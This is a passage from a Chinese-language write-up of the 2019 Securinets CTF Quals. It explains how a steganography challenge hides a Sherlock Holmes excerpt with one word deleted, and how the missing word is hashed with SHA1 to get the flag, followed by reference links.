点开后在证书中看到 flag：

![](/pics/2019-Securinets-CTF-Quals/13.png)

## EZ

图片隐写，[在线解密一下](https://stylesuxx.github.io/steganography/)：

```
--START--
"The fact is that upon his entrance I had instantly recognized the extreme
personal danger in which I lay. The only conceivable escape for him lay in silencing
my tongue. In an instant I had slipped the revolver from the drawer into my
pocket and was covering him through the cloth. At his remark I drew the weapon
out and laid it cocked upon the table. He still smiled and blinked, but there was
something about his eyes which made me feel very glad that I had it there,
"You evidently don't know me,' said he.
"'On the contrary,' I answered, 'I think it is fairly evident that I do. Pray take
a chair. I can spare you five minutes if you have anything to say.'
"'All that I have to say has already crossed your mind,' said he.
"'Then possibly my answer has crossed yours,' I replied.
"'You stand fast?'
"'Absolutely.'
"He clapped his hand into his pocket, and I raised the pistol from the table.
But he merely drew out a <DETELED_WORD> in which he had scribbled some
dates.
"You crossed my path on the fourth of January,' said he. 'On the twenty-third
you incommoded me; by the middle of February I was seriously inconvenienced
by you; at the end of March I was absolutely hampered in my plans; and now, at
the close of April, I find myself placed in such a position through your continual
persecution that I am in positive danger of losing my liberty. The situation is
becoming an impossible one.'
"'Have you any suggestion to make?' I asked.
"'You must drop it, Mr. Holmes,' said he, swaying his face about. 'You really
must, you know.'"
--END--;
```

可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google 之后发现是[福尔摩斯的一个片段](https://www.pagebypagebooks.com/Arthur_Conan_Doyle/Memoirs_of_Sherlock_Holmes/Adventure_XI_The_Final_Problem_p4.html)，找到单词之后，[在线 sha1](http://www.sha1-online.com/) 哈希一下得到 flag。

# Reference

http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/
https://www.youtube.com/watch?v=r23Yk2lutJ0&feature=youtu.be
https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043
https://www.rootnetsec.com/securinets-prequals-automateme/
https://ctftime.org/writeup/14075
